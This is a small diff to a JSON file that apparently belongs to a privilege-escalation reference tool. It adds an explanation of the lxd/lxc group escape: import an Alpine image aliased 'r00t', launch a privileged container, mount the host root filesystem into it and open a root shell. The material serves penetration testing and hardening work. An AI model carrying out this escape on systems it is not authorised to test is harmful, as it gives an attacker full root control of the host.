@@ -112,5 +112,6 @@
       "label": "Import a prebuilt alpine image",
       "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t"
     }
-  ]
+  ],
+  "explain": "Escapes to host root via lxd/lxc group by launching a privileged container:\n  lxc init <image> r00t    create a container named r00t from an imported image\n  -c security.privileged=true   run it privileged (no UID remapping)\nThen lxc config device add mounts the host / into it, and lxc exec drops you into a shell with root read/write of the host filesystem under /mnt/root."
 }
